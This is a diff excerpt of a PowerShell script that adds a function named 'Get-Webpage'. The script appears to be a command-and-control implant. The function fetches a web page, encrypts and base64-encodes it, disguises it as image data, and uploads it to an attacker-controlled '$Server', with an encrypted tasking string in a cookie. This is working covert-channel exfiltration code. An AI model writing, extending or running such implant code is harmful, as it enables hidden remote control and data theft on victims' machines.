@@ -460,3 +460,14 @@ try {
     Write-Error "Failed to get listening connections. $_"            
 }           
 }
+Function Get-Webpage {
+    param ($url)
+    $file = (New-Object System.Net.Webclient).DownloadString($url)|Out-String
+    $ReadCommand = "download-file web.html"
+    $ReadCommand = Encrypt-String $key $ReadCommand 
+    $bytes = [System.Text.Encoding]::UTF8.GetBytes($file)
+    $base64 = [Convert]::ToBase64String($bytes)  
+    $Output = Encrypt-String2 $key $base64
+    $UploadBytes = getimgdata $Output
+    (Get-Webclient -Cookie $ReadCommand).UploadData("$Server", $UploadBytes)|out-null
+}
